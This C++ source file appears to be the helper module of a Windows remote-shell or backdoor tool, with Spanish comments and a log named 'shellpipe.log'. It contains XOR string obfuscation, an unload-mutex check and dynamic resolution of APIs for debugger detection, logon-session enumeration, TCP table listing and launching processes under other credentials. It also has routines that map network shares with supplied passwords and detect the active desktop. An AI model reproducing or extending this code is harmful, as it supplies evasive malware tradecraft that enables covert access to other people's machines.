#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <time.h>

#include "util.h"

using namespace std;

FILE *fdLog = NULL;

class DecodeString{
	char *unEncStr;
	int unEncStrLen;

	BYTE ByteDecode(BYTE byte){
		int i;
		for(i=0; i<=sizeof(DWORD)-1; i++)
			byte ^= (BYTE)((ENC_DEC_KEY_STRING >> (i*8)) & 0xFF);
		return byte;
	}

public:
	LPSTR getDecodeString(LPSTR lpEncString){
		string tmpStr;
		int i;
		char byte;

		//MessageBox(0, "getDecodeString", 0, 0);

		if(this->unEncStr){
			delete[] this->unEncStr;
			this->unEncStr=NULL;
			this->unEncStrLen = 0;
		}

		if(!lpEncString) return NULL;
			
		for(i=0;;i++){
			byte = (char)this->ByteDecode(lpEncString[i]);
			if(!byte) break;
			tmpStr.append(1, byte);
		}

		if(tmpStr.length()){
			this->unEncStrLen = tmpStr.length();
			this->unEncStr = new CHAR[tmpStr.length()+2];
			if(!this->unEncStr){ 
				this->unEncStrLen = 0;	
				return NULL;
			}

			memset(this->unEncStr, 0, tmpStr.length()+2);
			strcpy(this->unEncStr, tmpStr.c_str());
			//MessageBox(0, this->unEncStr, NULL, NULL);
		}

		/*if(tmpStr.length())
			tmpStr.erase(0, tmpStr.length());*/
		return this->unEncStr;
	}

	int length(void){
		/*if(this->unEncStr)
			return strlen(this->unEncStr);*/
		//MessageBox(0, "length", 0, 0);
		return this->unEncStrLen;
	}

	DecodeString(void){
		this->unEncStr = NULL;
		this->unEncStrLen = 0;
	}

	~DecodeString(void){
		//cout << "From destructor!!" << endl;
		if(this->unEncStr){
			delete[] this->unEncStr;
			this->unEncStr = NULL;
		}
	}
};


//No se debe poner una sola interaccion para cualquier tiempo, ya que 
//podria dalse el caso de que el mutex se cree cuando se esta dentro
//del Sleep y terminado este saldria y devulveria FALSE cuando en relidad
//el mutex si se encuentra creado
BOOL WaitAndCheckUnloadMutex(DWORD dwInterval, DWORD dwSleepTime){
	HANDLE hMutex;
	int i;
	DecodeString ds;

	if((hMutex = OpenMutex(SYNCHRONIZE, FALSE, ds.getDecodeString((LPSTR)UNLOAD_MUTEX)))){
		CloseHandle(hMutex);
		return TRUE;
	}

	for(i=0; i<=(int)dwInterval-1; i++){
		Sleep(dwSleepTime);
		if((hMutex = OpenMutex(SYNCHRONIZE, FALSE, ds.getDecodeString((LPSTR)UNLOAD_MUTEX)))){
			CloseHandle(hMutex);
			return TRUE;
		}
	}
	return FALSE;
}

BOOL GetFunctionsEntryPoint(void){
	if(!(LsaEnumerateLogonSessions = (lpLsaEnumerateLogonSessions)GetProcAddress(LoadLibrary("Secur32.dll"), "LsaEnumerateLogonSessions")))
		return FALSE;

	if(!(LsaGetLogonSessionData = (lpLsaGetLogonSessionData)GetProcAddress(LoadLibrary("Secur32.dll"), "LsaGetLogonSessionData")))
		return FALSE;

	if(!(GetModuleFileNameEx = (lpGetModuleFileNameEx)GetProcAddress(LoadLibrary("Psapi.dll"), "GetModuleFileNameExA")))
		return FALSE;

	if(!(IsDebuggerPresent = (lpfIsDebuggerPresent)GetProcAddress(LoadLibrary("Kernel32.dll"), 
		"IsDebuggerPresent")))
		return FALSE;

	if(!(IcmpCreateFile = (lpfIcmpCreateFile)GetProcAddress(LoadLibrary("Iphlpapi.dll"), "IcmpCreateFile")))
		return FALSE;

	if(!(IcmpSendEcho = (lpfIcmpSendEcho)GetProcAddress(LoadLibrary("Iphlpapi.dll"), "IcmpSendEcho")))
		return FALSE;

	if(!(IcmpCloseHandle = (lpfIcmpCloseHandle)GetProcAddress(LoadLibrary("Iphlpapi.dll"), "IcmpCloseHandle")))
		return FALSE;

	if(!(HashData = (lpfHashData)GetProcAddress(LoadLibrary("shlwapi.dll"), "HashData")))
		return FALSE;

	if(!(GetTcpTable = (lpfGetTcpTable)GetProcAddress(LoadLibrary("iphlpapi.dll"), "GetTcpTable")))
		return FALSE;

	if(!(CreateProcessWithLogonW = (lpfCreateProcessWithLogonW)GetProcAddress(LoadLibrary("Advapi32.dll"), "CreateProcessWithLogonW")))
		return FALSE;

	if(!(ConvertStringSecurityDescriptorToSecurityDescriptor = 
		(lpfConvertStringSecurityDescriptorToSecurityDescriptor) 
		GetProcAddress(LoadLibrary("Advapi32.dll"), "ConvertStringSecurityDescriptorToSecurityDescriptorA")))
		return FALSE;

	return TRUE;
}

DWORD GetServiceState(LPSTR lpName){
	SC_HANDLE ScHandle=NULL, hService=NULL;
	DWORD dwRetVal=NULL;
	SERVICE_STATUS ServiceStatus = {0};

	if(!lpName)
		return -1;
	
	if(!(ScHandle = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, GENERIC_READ))){
		return -1;
	}

	if(!(hService = OpenService(ScHandle, lpName, SERVICE_QUERY_STATUS))){
		dwRetVal = -1;
		goto Cleanup;
	}

	if(!QueryServiceStatus(hService, &ServiceStatus)){
		dwRetVal = -1;
		goto Cleanup;
	}

	dwRetVal = ServiceStatus.dwCurrentState;
Cleanup:
	if(ScHandle)
		CloseServiceHandle(ScHandle);

	if(hService)
		CloseServiceHandle(hService);

	return dwRetVal;
}

BOOL MakeConnectionToNetworkResource(LPSTR lpRemoteName, LPSTR lpUser, LPSTR lpPassword){
	NETRESOURCE netResource={0};

	if(!lpRemoteName)
		return FALSE;

	netResource.lpRemoteName = lpRemoteName;
	
	if(WNetAddConnection2(&netResource, lpPassword, lpUser, NULL) != NO_ERROR)
		return FALSE;

	return TRUE;
}

BOOL TerminateConnectionToNetworkResource(LPSTR lpName){
	if(WNetCancelConnection2(lpName, NULL, TRUE) != NO_ERROR)
		return FALSE;

	return TRUE;
}

#ifdef DEBUG_SHOW_ERROR_TO_FILE
BOOL fileLogPrint(LPCSTR szLog){
	LPSTR lpTmpString;
	time_t current_time = time(NULL);

	if(!szLog) return FALSE;

	lpTmpString = new CHAR[strlen(szLog) + MAX_PATH];
	if(!lpTmpString) return FALSE;

	if(!fdLog){
		if(!(fdLog = fopen("c:\\shellpipe.log", "a"))){
			if(!(fdLog = fopen("c:\\shellpipe.log", "w"))){
				return FALSE;
			}
		}
	}

	strftime(lpTmpString, strlen(szLog) + MAX_PATH, "[%Y/%m/%d %H:%M:%S] - ", localtime(&current_time));
	sprintf((LPSTR)(lpTmpString + strlen(lpTmpString)), "%d - ", GetCurrentProcessId());
	strcat(lpTmpString, szLog);
	strcat(lpTmpString, "\r\n");

	fputs(lpTmpString, fdLog);
	fflush(fdLog);
	return TRUE;
}
#endif

BOOL GetActiveDesktop(LPSTR lpBuffer, DWORD cbSize){
	HDESK hDesk = NULL;
	BOOL retVal = TRUE;
	DWORD dwBytesNeeded=NULL;
	CHAR tmpBuffer[MAX_PATH] = {0};

	if(!lpBuffer || !cbSize) return FALSE;
	
	strcpy(tmpBuffer, "WINSTA0\\");

	if(!(hDesk = OpenInputDesktop(NULL, FALSE, GENERIC_READ))){
		retVal = FALSE;
		if(!GetLastError()){
			strcat(tmpBuffer, "Winlogon");
			strncpy(lpBuffer, tmpBuffer, cbSize);
		}
		goto Cleanup;
	}
	
	//WINSTA0\\Default
	if(!GetUserObjectInformation(hDesk, UOI_NAME, (tmpBuffer+strlen(tmpBuffer)), MAX_PATH, &dwBytesNeeded)){
		retVal = FALSE;
		goto Cleanup;
	}

	if(cbSize < strlen(tmpBuffer)){
		retVal = FALSE;
		goto Cleanup;
	}

	strncpy(lpBuffer, tmpBuffer, cbSize);

Cleanup:
	if(hDesk) CloseDesktop(hDesk);
	return retVal;
}
